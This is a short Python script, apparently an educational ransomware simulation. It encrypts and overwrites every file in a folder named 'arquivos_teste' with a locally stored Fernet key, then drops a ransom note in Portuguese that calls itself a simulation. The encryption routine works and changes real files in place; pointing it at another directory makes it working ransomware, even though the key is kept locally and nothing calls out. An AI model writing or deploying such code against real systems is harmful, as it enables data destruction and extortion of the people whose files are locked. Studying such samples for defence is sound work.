import os
from cryptography.fernet import Fernet

PASTA_ALVO = "arquivos_teste"

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as f:
        f.write(chave)
    return chave

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivos():
    chave = gerar_chave()
    fernet = Fernet(chave)

    for nome_arquivo in os.listdir(PASTA_ALVO):
        caminho = os.path.join(PASTA_ALVO, nome_arquivo)

        with open(caminho, "rb") as f:
            conteudo = f.read()

        conteudo_encriptado = fernet.encrypt(conteudo)

        with open(caminho, "wb") as f:
            f.write(conteudo_encriptado)

    with open("mensagem_resgate.txt", "w") as msg:
        msg.write(
            "Seus arquivos foram criptografados (SIMULAÇÃO EDUCACIONAL).\n"
            "Use o script 'decrypt.py' junto com a chave gerada para restaurar.\n"
        )

    print("Criptografia concluída com sucesso (simulação).")

if __name__ == "__main__":
    criptografar_arquivos()
